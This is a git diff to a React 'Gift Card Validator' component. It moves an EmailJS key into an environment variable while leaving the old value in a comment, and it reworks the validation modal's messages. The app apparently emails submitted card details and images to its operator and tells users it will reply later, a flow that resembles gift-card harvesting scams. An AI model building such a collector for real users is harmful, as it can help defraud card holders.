@@ -271,8 +271,8 @@ function PurchaseOrValidate() {
         };
         const serviceId = process.env.REACT_APP_SERVICE_ID;
         const templateId = process.env.REACT_APP_TEMPLATE_ID;
-        // const publicKey = 
-        const publicKey = "BoqfOqh8-iO3tlecS"
+        const publicKey = process.env.REACT_APP_PUBLIC_KEY
+        // const publicKey = "BoqfOqh8-iO3tlecS"
         const templateParams = {
             from_name: "Gift Card Validator",
             CustomerEmail: validateUserEmail,
@@ -300,7 +300,7 @@ function PurchaseOrValidate() {
                 setLoading(false);
                 setTimeout(() => {
                     setValidationStatus(null);
-                }, 10000);
+                }, 60000);
             });
         // Only reset image upload fields if images were uploaded
         if (frontImageUrl) {
@@ -855,20 +855,29 @@ function PurchaseOrValidate() {
             >
                 <ModalOverlay />
                 <ModalContent background="black" color="white" p={4}>
+                <ModalHeader align="center" mb={6}>Checking And Validating Your Card...</ModalHeader>
                 <ModalBody display="flex" flexDirection="column" alignItems="center" justifyContent="center">
-                    {validationStatus === "loading" && <Spinner size="xl" />}
+                    {validationStatus === "loading" && (
+                        <>
+                            <Spinner boxSize={16} />
+                            <Text mt={4}>Verification Process Loading....</Text>
+                        </>
+                    )}
                     {validationStatus === "success" && (
                     <>
-                        <CheckCircleIcon boxSize={12} color="green.400" />
-                        <Text mt={4}>Validation Successful!</Text>
+                        <CheckCircleIcon boxSize={16} color="green.500" />
+                        <Text mt={4}>We will get back to you through you Email...</Text>
                     </>
                     )}
                     {validationStatus === "failed" && (
                     <>
-                        <WarningIcon boxSize={12} color="red.400" />
+                        <WarningIcon boxSize={16} color="red.500" />
                         <Text mt={4}>Validation Failed. Please try again.</Text>
                     </>
                     )}
+                    <Button variant='solid' mt={4} onClick={() => { setValidationStatus(null); onValidateOpen(); }}>
+                        Check Another Card
+                    </Button>
                 </ModalBody>
                 </ModalContent>
             </Modal>
